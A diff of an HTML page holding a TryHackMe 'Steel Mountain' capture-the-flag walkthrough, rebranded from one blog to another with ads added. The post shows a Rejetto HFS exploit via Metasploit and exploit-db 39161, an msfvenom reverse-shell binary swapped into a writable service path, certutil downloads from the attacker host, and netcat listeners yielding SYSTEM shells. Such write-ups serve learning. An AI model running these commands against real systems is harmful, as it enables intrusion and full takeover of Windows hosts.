@@ -1,243 +1,184 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    
-      <title>
-        Steel Mountain 🏔 ::
-        bhavsec — portfolio &amp; blog
-      </title>
-    
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta
-  name="description"
-  content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
-Nmap nmap -sC -sV -Pn 10.10.100.168 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST Nmap scan report for 10.10.100.168 Host is up (0.21s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8."
-/>
-<meta
-  name="keywords"
-  content="bhavsec, cybersecurity, penetration testing"
-/>
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://bhavsec.com/posts/steel-mountain/" />
 
+<head>
+  <title>Steel Mountain 🏔 — Waseem Akram</title>
 
-
-
-
-<link rel="stylesheet" href="../../assets/style.css" />
-
-<link rel="stylesheet" href="../../style.css" />
-
-
-<link
-  rel="apple-touch-icon-precomposed"
-  sizes="144x144"
-  href="../../img/apple-touch-icon-144-precomposed.png"
-/>
-<link rel="shortcut icon" href="../../img/favicon.png" />
-
-
-<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-
-
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://bhavsec.com/img/cover.png"/>
-
-<meta name="twitter:title" content="Steel Mountain 🏔"/>
-<meta name="twitter:description" content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
-Nmap nmap -sC -sV -Pn 10.10.100.168 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST Nmap scan report for 10.10.100.168 Host is up (0.21s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8."/>
-
-
-
-<meta property="og:title" content="Steel Mountain 🏔" />
-<meta property="og:description" content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description"
+    content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
 Nmap nmap -sC -sV -Pn 10.10.100.168 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST Nmap scan report for 10.10.100.168 Host is up (0.21s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://bhavsec.com/posts/steel-mountain/" /><meta property="og:image" content="https://bhavsec.com/img/cover.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-01-27T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2022-01-27T00:00:00&#43;00:00" /><meta property="og:site_name" content="bhavsec" />
+  <meta name="keywords" content="https://www.hackerwasii.com, cybersecurity, penetration testing" />
+  <meta name="robots" content="noodp" />
+  <link rel="canonical" href="https://www.hackerwasii.com/posts/steel-mountain/" />
 
+  <link rel="stylesheet" href="../../assets/style.css" />
 
+  <link rel="stylesheet" href="../../style.css" />
 
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../img/apple-touch-icon-144-precomposed.png" />
+  <link rel="shortcut icon" href="../../img/favicon.png" />
 
+  <link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
 
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://www.hackerwasii.com/img/cover.png" />
 
+  <meta name="twitter:title" content="Steel Mountain 🏔" />
+  <meta name="twitter:description"
+    content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
+Nmap nmap -sC -sV -Pn 10.10.100.168 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST Nmap scan report for 10.10.100.168 Host is up (0.21s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8." />
 
-  </head>
-  <body class="">
-    <div class="container">
-      <header class="header">
-  <span class="header__inner">
-    <a
-  href="http://bhavsec.com/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text">
-      bhavsec/</span>
-    <span class="logo__text" style="color:red">posts/</span>
-    <span class="logo__cursor"></span>
+  <meta property="og:title" content="Steel Mountain 🏔" />
+  <meta property="og:description"
+    content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
+Nmap nmap -sC -sV -Pn 10.10.100.168 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST Nmap scan report for 10.10.100.168 Host is up (0.21s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://www.hackerwasii.com/posts/steel-mountain/" />
+  <meta property="og:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta property="article:section" content="posts" />
+  <meta property="article:published_time" content="2022-01-27T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2022-01-27T00:00:00&#43;00:00" />
+  <meta property="og:site_name" content="https://www.hackerwasii.com" />
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0PCVFG8BNK"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
 
-  
-</a>
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
 
-    <span class="header__right">
-      
-        <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="../../resume">📄 resume</a></li>
-        
-      
-        
-          <li><a href="../../posts">📚 blog</a></li>
-        
-      
-        
-          <li><a href="../../whoami">🔎 whoami </a></li>
-        
-      
-        
-          <li><a href="../../resources">🚀 resources</a></li>
-        
-      
-      
-      
-  </ul>
+    gtag('config', 'G-0PCVFG8BNK');
+  </script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000"
+    crossorigin="anonymous"></script>
+</head>
 
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="../../resume">📄 resume</a></li>
-      
-    
-      
-        <li><a href="../../posts">📚 blog</a></li>
-      
-    
-      
-        <li><a href="../../whoami">🔎 whoami </a></li>
-      
-    
-      
-        <li><a href="../../resources">🚀 resources</a></li>
-      
-    
-  </ul>
-</nav>
+<body class="">
+  <div class="container">
+    <header class="header">
+      <span class="header__inner">
+        <a href="https://www.hackerwasii.com/" class="logo" style="text-decoration: none">
+          <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+              <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+            </svg>
+          </span>
+          <span class="logo__text"> wasii/</span>
+          <span class="logo__text" style="color: red">posts/</span>
+          <span class="logo__cursor"></span>
+        </a>
 
-        <span class="menu-trigger">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-            <path d="M0 0h24v24H0z" fill="none" />
-            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-          </svg>
-        </span>
-      
-      <span class="theme-toggle">
-        <svg
-  class="theme-toggler"
-  width="24"
-  height="24"
-  viewBox="0 0 48 48"
-  fill="none"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path
-    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+        <span class="header__right">
+          <nav class="menu">
+            <ul class="menu__inner menu__inner--desktop">
+              <li><a href="../../resume">📄 resume</a></li>
+
+              <li><a href="../../posts">📚 blog</a></li>
+
+              <li><a href="../../whoami">🔎 whoami </a></li>
+
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+
+            <ul class="menu__inner menu__inner--mobile">
+              <li><a href="../../resume">📄 resume</a></li>
+
+              <li><a href="../../posts">📚 blog</a></li>
+
+              <li><a href="../../whoami">🔎 whoami </a></li>
+
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+          </nav>
+
+          <span class="menu-trigger">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M0 0h24v24H0z" fill="none" />
+              <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+            </svg>
+          </span>
+
+          <span class="theme-toggle">
+            <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"
+              xmlns="http://www.w3.org/2000/svg">
+              <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
-  />
-</svg>
-
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z" />
+            </svg>
+          </span>
+        </span>
       </span>
-    </span>
-  </span>
-</header>
+    </header>
 
+    <div class="content">
+      <div class="post">
+        <h1 class="post-title">Steel Mountain 🏔</h1>
+        <div class="post-meta">
+          <span class="post-date"> 2022-01-27 </span>
+        </div>
 
-      <div class="content">
-        
-  
-  
+        <span class="post-tags">
+          <a href="../../tags/windows/index.html">#windows</a>&nbsp;
 
-  <div class="post">
-    <h1 class="post-title">Steel Mountain 🏔</h1>
-    <div class="post-meta">
-      
-        <span class="post-date">
-          2022-01-27
+          <a href="../../tags/privesc/index.html">#privesc</a>&nbsp;
+
+          <a href="../../tags/tryhackme/index.html">#tryhackme</a>&nbsp;
+
+          <a href="../../tags/infosec/index.html">#infosec</a>&nbsp;
         </span>
 
-        
-          
-        
-      
+        <div class="post-content">
+          <h2>Table of Contents</h2>
+          <aside class="table-of-contents">
+            <nav id="TableOfContents">
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="index.html#nmap">Nmap</a></li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="index.html#exploiting-with-metasploit">Exploiting with Metasploit</a>
+                  <ul>
+                    <li>
+                      <a href="index.html#upload-powerup-to-remote-machine">Upload PowerUp to remote machine</a>
+                    </li>
+                    <li>
+                      <a href="index.html#execute-powerup-script-in-powershell">Execute PowerUp Script in Powershell</a>
+                    </li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="index.html#exploiting-manually">Exploiting Manually</a>
+                  <ul>
+                    <li>
+                      <a href="index.html#privilege-escalation">Privilege Escalation</a>
+                    </li>
+                    <li>
+                      <a href="index.html#running-winpeas">Running winPEAS</a>
+                    </li>
+                  </ul>
+                </li>
+              </ul>
+            </nav>
+          </aside>
 
-      
-
-
-      
-    </div>
-
-    
-      <span class="post-tags">
-        
-          <a href="../../tags/windows/index.html">#windows</a>&nbsp;
-        
-          <a href="../../tags/privesc/index.html">#privesc</a>&nbsp;
-        
-          <a href="../../tags/tryhackme/index.html">#tryhackme</a>&nbsp;
-        
-          <a href="../../tags/infosec/index.html">#infosec</a>&nbsp;
-        
-      </span>
-    
-
-    
-
-    <div class="post-content">
-      
-        
-        <h2>Table of Contents</h2>
-        <aside class="table-of-contents"><nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="index.html#nmap">Nmap</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#exploiting-with-metasploit">Exploiting with Metasploit</a>
-      <ul>
-        <li><a href="index.html#upload-powerup-to-remote-machine">Upload PowerUp to remote machine</a></li>
-        <li><a href="index.html#execute-powerup-script-in-powershell">Execute PowerUp Script in Powershell</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#exploiting-manually">Exploiting Manually</a>
-      <ul>
-        <li><a href="index.html#privilege-escalation">Privilege Escalation</a></li>
-        <li><a href="index.html#running-winpeas">Running winPEAS</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav></aside>
-        
-      
-      <p>In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.</p>
-<h3 id="nmap">Nmap</h3>
-<pre><code>nmap -sC -sV -Pn 10.10.100.168                                                                            130 ⨯
+          <p>
+            In this blog you will learn to enumerate a Windows machine, gain
+            initial access with Metasploit, use Powershell to further
+            enumerate the machine and escalate your privileges to
+            Administrator.
+          </p>
+          <h3 id="nmap">Nmap</h3>
+          <pre><code>nmap -sC -sV -Pn 10.10.100.168                                                                            130 ⨯
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST
 Nmap scan report for 10.10.100.168
 Host is up (0.21s latency).
@@ -292,8 +233,9 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 108.09 seconds
 
-</code></pre><h2 id="exploiting-with-metasploit">Exploiting with Metasploit</h2>
-<pre><code>msfconsole
+</code></pre>
+          <h2 id="exploiting-with-metasploit">Exploiting with Metasploit</h2>
+          <pre><code>msfconsole
 
 msf6 &gt; search rejetto
 
@@ -352,16 +294,37 @@ Logged On Users : 1
 Meterpreter     : x86/windows
 meterpreter &gt; 
 
-</code></pre><h3 id="upload-powerup-to-remote-machine">Upload PowerUp to remote machine</h3>
-<p>To enumerate this machine, we will use a powershell script called PowerUp, that&rsquo;s purpose is to evaluate a Windows machine and determine any abnormalities - &ldquo;<em>PowerUp aims to be a clearinghouse of common Windows privilege escalation</em> <em>vectors that rely on misconfigurations.</em>&rdquo;</p>
-<p>You can download the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">here</a>. Now you can use the <strong>upload</strong> command in Metasploit to upload the script.</p>
-<pre><code>meterpreter &gt; upload /root/scripts/privesc/windows/powerup.ps1
+</code></pre>
+          <h3 id="upload-powerup-to-remote-machine">
+            Upload PowerUp to remote machine
+          </h3>
+          <p>
+            To enumerate this machine, we will use a powershell script called
+            PowerUp, that&rsquo;s purpose is to evaluate a Windows machine and
+            determine any abnormalities - &ldquo;<em>PowerUp aims to be a clearinghouse of common Windows privilege
+              escalation</em>
+            <em>vectors that rely on misconfigurations.</em>&rdquo;
+          </p>
+          <p>
+            You can download the script
+            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">here</a>. Now you
+            can use the <strong>upload</strong> command in
+            Metasploit to upload the script.
+          </p>
+          <pre><code>meterpreter &gt; upload /root/scripts/privesc/windows/powerup.ps1
 [*] uploading  : /root/scripts/privesc/windows/powerup.ps1 -&gt; powerup.ps1
 [*] Uploaded 586.52 KiB of 586.52 KiB (100.0%): /root/scripts/privesc/windows/powerup.ps1 -&gt; powerup.ps1
 [*] uploaded   : /root/scripts/privesc/windows/powerup.ps1 -&gt; powerup.ps1
-</code></pre><h3 id="execute-powerup-script-in-powershell">Execute PowerUp Script in Powershell</h3>
-<p>To execute this using Meterpreter, I will type <strong>load powershell</strong> into meterpreter. Then I will enter powershell by entering <strong>powershell_shell</strong>:</p>
-<pre><code>meterpreter &gt; load powershell
+</code></pre>
+          <h3 id="execute-powerup-script-in-powershell">
+            Execute PowerUp Script in Powershell
+          </h3>
+          <p>
+            To execute this using Meterpreter, I will type
+            <strong>load powershell</strong> into meterpreter. Then I will
+            enter powershell by entering <strong>powershell_shell</strong>:
+          </p>
+          <pre><code>meterpreter &gt; load powershell
 Loading extension powershell...Success.
 
 meterpreter &gt; powershell_shell
@@ -419,8 +382,15 @@ Name           : AdvancedSystemCareService9
 Check          : Unquoted Service Paths
 
 ...
-</code></pre><p>The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!</p>
-<pre><code>ServiceName    : AdvancedSystemCareService9
+</code></pre>
+          <p>
+            The CanRestart option being true, allows us to restart a service
+            on the system, the directory to the application is also
+            write-able. This means we can replace the legitimate application
+            with our malicious one, restart the service, which will run our
+            infected program!
+          </p>
+          <pre><code>ServiceName    : AdvancedSystemCareService9
 Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
 ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
 StartName      : LocalSystem
@@ -428,8 +398,11 @@ AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &l
 CanRestart     : True
 Name           : AdvancedSystemCareService9
 Check          : Unquoted Service Paths
-</code></pre><p>Use msfvenom to generate a reverse shell as an Windows executable.</p>
-<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.12.105 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+</code></pre>
+          <p>
+            Use msfvenom to generate a reverse shell as an Windows executable.
+          </p>
+          <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.12.105 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
@@ -439,13 +412,21 @@ x86/shikata_ga_nai chosen with final size 351
 Payload size: 351 bytes
 Final size of exe file: 73802 bytes
 Saved as: advanced.exe
-</code></pre><p>Upload  binary and replace the legitimate one. Then restart the program to get a shell as root.</p>
-<pre><code>meterpreter &gt; upload /root/thm/steelmountain/ASCService.exe
+</code></pre>
+          <p>
+            Upload binary and replace the legitimate one. Then restart the
+            program to get a shell as root.
+          </p>
+          <pre><code>meterpreter &gt; upload /root/thm/steelmountain/ASCService.exe
 [*] uploading  : /root/thm/steelmountain/ASCService.exe -&gt; ASCService.exe
 [*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/thm/steelmountain/ASCService.exe -&gt; ASCService.exe
 [*] uploaded   : /root/thm/steelmountain/ASCService.exe -&gt; ASCService.exe
-</code></pre><p>Stop the already running AdvancedSystemCareService9 to replace the file</p>
-<pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc stop AdvancedSystemCareService9
+</code></pre>
+          <p>
+            Stop the already running AdvancedSystemCareService9 to replace the
+            file
+          </p>
+          <pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc stop AdvancedSystemCareService9
 
 SERVICE_NAME: AdvancedSystemCareService9 
         TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
@@ -455,13 +436,16 @@ SERVICE_NAME: AdvancedSystemCareService9
         SERVICE_EXIT_CODE  : 0  (0x0)
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x0
-</code></pre><p>Setup Netcat Listener</p>
-<pre><code>nc -nvlp 4443                                                                                              148 ⨯ 2 ⚙
+</code></pre>
+          <p>Setup Netcat Listener</p>
+          <pre><code>nc -nvlp 4443                                                                                              148 ⨯ 2 ⚙
 listening on [any] 4443 ...
-</code></pre><p>Run the malicious service</p>
-<pre><code>sc start AdvancedSystemCareService9
-</code></pre><p>Root owned</p>
-<pre><code>nc -nvlp 4443                                                                                              148 ⨯ 2 ⚙
+</code></pre>
+          <p>Run the malicious service</p>
+          <pre><code>sc start AdvancedSystemCareService9
+</code></pre>
+          <p>Root owned</p>
+          <pre><code>nc -nvlp 4443                                                                                              148 ⨯ 2 ⚙
 listening on [any] 4443 ...
 connect to [10.13.12.105] from (UNKNOWN) [10.10.233.34] 49347
 Microsoft Windows [Version 6.3.9600]
@@ -488,21 +472,39 @@ dir
 C:\Users\Administrator\Desktop&gt;type root.txt
 type root.txt
 *******************************
-</code></pre><h2 id="exploiting-manually">Exploiting Manually</h2>
-<p>To begin we shall be using the same CVE. However, this time let&rsquo;s use this <a href="https://www.exploit-db.com/exploits/39161">exploit.</a></p>
-<p><em>Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!</em></p>
-<p>To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">GitHub</a>!</p>
-<p>You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!</p>
-<p>Python3 HTTP Server</p>
-<pre><code>python3 -m http.server 80
-</code></pre><p>Exploit (Running x2 time)</p>
-<pre><code>┌──(root💀kali)-[~/thm/steelmountain]
+</code></pre>
+          <h2 id="exploiting-manually">Exploiting Manually</h2>
+          <p>
+            To begin we shall be using the same CVE. However, this time
+            let&rsquo;s use this
+            <a href="https://www.exploit-db.com/exploits/39161">exploit.</a>
+          </p>
+          <p>
+            <em>Note that you will need to have a web server and a netcat
+              listener active at the same time in order for this to work!</em>
+          </p>
+          <p>
+            To begin, you will need a netcat static binary on your web server.
+            If you do not have one, you can download it from
+            <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">GitHub</a>!
+          </p>
+          <p>
+            You will need to run the exploit twice. The first time will pull
+            our netcat binary to the system and the second will execute our
+            payload to gain a callback!
+          </p>
+          <p>Python3 HTTP Server</p>
+          <pre><code>python3 -m http.server 80
+</code></pre>
+          <p>Exploit (Running x2 time)</p>
+          <pre><code>┌──(root💀kali)-[~/thm/steelmountain]
 └─# python2 39161.py 10.10.233.34 8080                                                                          1 ⨯
                                                                                                                     
 ┌──(root💀kali)-[~/thm/steelmountain]
 └─# python2 39161.py 10.10.233.34 8080
-</code></pre><p>Netcat Listener</p>
-<pre><code>nc -nvlp 1234
+</code></pre>
+          <p>Netcat Listener</p>
+          <pre><code>nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.13.12.105] from (UNKNOWN) [10.10.233.34] 49459
 Microsoft Windows [Version 6.3.9600]
@@ -511,14 +513,16 @@ Microsoft Windows [Version 6.3.9600]
 C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;whoami
 whoami
 steelmountain\bill
-</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
-<p>Fetching winPEAS from Kali</p>
-<pre><code>C:\Temp&gt;certutil -urlcache -f http://10.13.12.105/winPEASx64.exe winpeas.exe
+</code></pre>
+          <h3 id="privilege-escalation">Privilege Escalation</h3>
+          <p>Fetching winPEAS from Kali</p>
+          <pre><code>C:\Temp&gt;certutil -urlcache -f http://10.13.12.105/winPEASx64.exe winpeas.exe
 certutil -urlcache -f http://10.13.12.105/winPEASx64.exe winpeas.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-</code></pre><h3 id="running-winpeas">Running winPEAS</h3>
-<pre><code>C:\Temp&gt;.\winpeas.exe servicesinfo
+</code></pre>
+          <h3 id="running-winpeas">Running winPEAS</h3>
+          <pre><code>C:\Temp&gt;.\winpeas.exe servicesinfo
 .\winpeas.exe servicesinfo
 ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
      
@@ -645,15 +649,18 @@ ADVISORY: winpeas should be used for authorized penetration testing and/or educa
        |---------------------------------------------------------------------------|
        |                                 Thank you!                                |
        \---------------------------------------------------------------------------/
-</code></pre><p>Download and replace the SystemCare Service</p>
-<pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;certutil -urlcache -f http://10.13.12.105/ASCService.exe ASCService.exe
+</code></pre>
+          <p>Download and replace the SystemCare Service</p>
+          <pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;certutil -urlcache -f http://10.13.12.105/ASCService.exe ASCService.exe
 certutil -urlcache -f http://10.13.12.105/ASCService.exe ASCService.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-</code></pre><p>Run the service</p>
-<pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc start AdvancedSystemCareService9
-</code></pre><p>Root Owned</p>
-<pre><code>nc -nvlp 4443                     
+</code></pre>
+          <p>Run the service</p>
+          <pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc start AdvancedSystemCareService9
+</code></pre>
+          <p>Root Owned</p>
+          <pre><code>nc -nvlp 4443                     
 listening on [any] 4443 ...
 connect to [10.13.12.105] from (UNKNOWN) [10.10.233.34] 49551
 Microsoft Windows [Version 6.3.9600]
@@ -663,100 +670,65 @@ C:\Windows\system32&gt;whoami
 whoami
 nt authority\system
 </code></pre>
-    </div>
-    
-      
+        </div>
+
         <div class="pagination">
           <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
+            <span class="pagination__title-h">Read other posts</span>
             <hr />
           </div>
           <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="https://bhavsec.com/posts/ejpt-cheatsheet/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">eJPT Cheatsheet 🎓</span>
-                </a>
-              </span>
-            
-            
-              <span class="button next">
-                <a href="https://bhavsec.com/posts/active-directory-resources/">
-                  <span class="button__text">Active Directory Pentesting Resources 📚</span>
-                  <span class="button__icon">→</span>
-                </a>
-              </span>
-            
+            <span class="button previous">
+              <a href="https://www.hackerwasii.com/posts/ejpt-cheatsheet/">
+                <span class="button__icon">←</span>
+                <span class="button__text">eJPT Cheatsheet 🎓</span>
+              </a>
+            </span>
+
+            <span class="button next">
+              <a href="https://www.hackerwasii.com/posts/active-directory-resources/">
+                <span class="button__text">Active Directory Pentesting Resources 📚</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
           </div>
         </div>
-      
-    
-
-    
-      
-        
-
-      
-    
-  </div>
-
       </div>
-
-      
-        <footer class="footer">
-  <div class="footer__inner">
-    
-      
-      <div class="copyright">
-        <span> 
-          © 2018-2022
-        </span>
-      </div>
-      <div>
-        <span>    
-        <span>
-        <a href="../../archive">archive</a>
-        &nbsp; 
-        </span>
-          <a href="../../newsletter">newsletter</a>
-        </span>   
-        &nbsp;      
-        <span>
-          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
-        </span>
-        &nbsp;      
-        <span>
-          <a href="http://bhavsec.com/posts/index.xml" target=”_blank”>rss feed</a>
-        </span>
-
-      </div>
-
-    
-  </div>
-</footer>
-
-<script src="../../assets/main.js"></script>
-<script src="../../assets/prism.js"></script>
-
-      
     </div>
+    <!-- hackerwasii -->
+    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9670252621494000" data-ad-slot="1081579313"
+      data-ad-format="auto" data-full-width-responsive="true"></ins>
+    <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+    <footer class="footer">
+      <div class="footer__inner">
+        <div class="copyright">
+          <span> © 2020-2022 Waseem Akram</span>
+        </div>
+        <div>
+          <span>
+            <span>
+              <a href="../../archive">archive</a>
+              &nbsp;
+            </span>
+            <a href="../../newsletter">newsletter</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="”_blank”">license</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://www.hackerwasii.com/posts/index.xml" target="”_blank”">rss feed</a>
+          </span>
+        </div>
+      </div>
+    </footer>
 
-    
-      
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-VY7WJZSQD0"></script>
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
-	gtag('config', 'G-VY7WJZSQD0', { 'anonymize_ip': false });
-}
-</script>
+    <script src="../../assets/main.js"></script>
+    <script src="../../assets/prism.js"></script>
+  </div>
+</body>
 
-    
-  </body>
 </html>
